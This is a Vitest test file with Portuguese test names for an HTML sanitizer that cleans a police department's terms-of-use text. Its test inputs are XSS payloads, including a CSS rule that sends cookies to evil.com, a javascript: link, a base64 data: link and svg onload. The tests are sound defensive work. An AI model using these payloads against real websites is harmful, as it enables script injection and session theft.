import { describe, it, expect } from 'vitest';
import { sanitizeTermoHtml } from '../sanitize';
import { CONTEUDO_HTML, calcularHashTermo } from '../termo-vigente';

describe('sanitizeTermoHtml — vetores de ataque', () => {
	it('remove <script> com conteúdo', () => {
		const html = '<p>ok</p><script>alert(1)</script><p>fim</p>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('script');
		expect(out).not.toContain('alert');
		expect(out).toContain('<p>ok</p>');
		expect(out).toContain('<p>fim</p>');
	});

	it('remove <style> que permite exfiltração via background-image:url()', () => {
		const html = '<style>p { background: url("//evil.com/?cookie=" + document.cookie); }</style><p>ok</p>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('style');
		expect(out).not.toContain('evil.com');
	});

	it('remove <iframe>', () => {
		const html = '<iframe src="//evil.com"></iframe>';
		expect(sanitizeTermoHtml(html)).toBe('');
	});

	it('remove <svg> e <math> (XSS DOM clobbering)', () => {
		expect(sanitizeTermoHtml('<svg onload=alert(1)></svg>')).toBe('');
		expect(sanitizeTermoHtml('<math><mtext><script>alert(1)</script></mtext></math>')).toBe('');
	});

	it('strip de event handlers inline (onclick, onerror, onload)', () => {
		const html = '<p onclick="alert(1)" onmouseover="x()">ok</p>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('onclick');
		expect(out).not.toContain('onmouseover');
		expect(out).not.toContain('alert');
		expect(out).toContain('<p>ok</p>');
	});

	it('bloqueia href javascript:', () => {
		const html = '<a href="javascript:alert(1)">click</a>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('javascript:');
		expect(out).toContain('<a>click</a>');
	});

	it('bloqueia href data:text/html;base64,...', () => {
		const html = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('data:');
	});

	it('aceita href https://, mailto:, paths relativos e âncoras', () => {
		expect(sanitizeTermoHtml('<a href="https://x.com">x</a>')).toContain('href="https://x.com"');
		expect(sanitizeTermoHtml('<a href="mailto:a@b.com">x</a>')).toContain('href="mailto:a@b.com"');
		expect(sanitizeTermoHtml('<a href="/termo/dpo">x</a>')).toContain('href="/termo/dpo"');
		expect(sanitizeTermoHtml('<a href="#secao">x</a>')).toContain('href="#secao"');
	});

	it('remove tags fora da allowlist (input, button, form, etc.)', () => {
		expect(sanitizeTermoHtml('<input type=text>')).toBe('');
		// <form> é dangerous block — TODO o conteúdo é removido (mais conservador
		// que apenas o wrapper, propositalmente).
		expect(sanitizeTermoHtml('<form action="//evil"><button>x</button></form>')).toBe('');
		// Para tags fora da allowlist que NÃO são dangerous (ex: <hr>), apenas o
		// wrapper é removido e o texto interno preservado.
		expect(sanitizeTermoHtml('<aside>texto interno</aside>')).toBe('texto interno');
	});

	it('remove atributos fora da allowlist (id, style direto, data-*)', () => {
		const html = '<p id="x" style="color:red" data-foo="1" class="ok">y</p>';
		const out = sanitizeTermoHtml(html);
		expect(out).not.toContain('id=');
		expect(out).not.toContain('style=');
		expect(out).not.toContain('data-foo');
		expect(out).toContain('class="ok"');
	});

	it('preserva o conteúdo válido do termo vigente intacto na estrutura', () => {
		const out = sanitizeTermoHtml(CONTEUDO_HTML);
		// Conteúdo essencial deve sobreviver:
		expect(out).toContain('Polícia Civil do Estado do Ceará');
		expect(out).toContain('<h3>');
		expect(out).toContain('<strong>');
		expect(out).toContain('<ul>');
		expect(out).toContain('<li>');
		// Nenhuma tag perigosa
		expect(out).not.toMatch(/<script/i);
		expect(out).not.toMatch(/<style/i);
		expect(out).not.toMatch(/onerror=|onclick=|onload=/i);
	});
});

describe('hash do termo (snapshot — alterações exigem revisão consciente)', () => {
	it('hash do termo vigente é determinístico', async () => {
		const h1 = await calcularHashTermo();
		const h2 = await calcularHashTermo();
		expect(h1).toBe(h2);
		expect(h1).toMatch(/^[0-9a-f]{64}$/);
	});
});
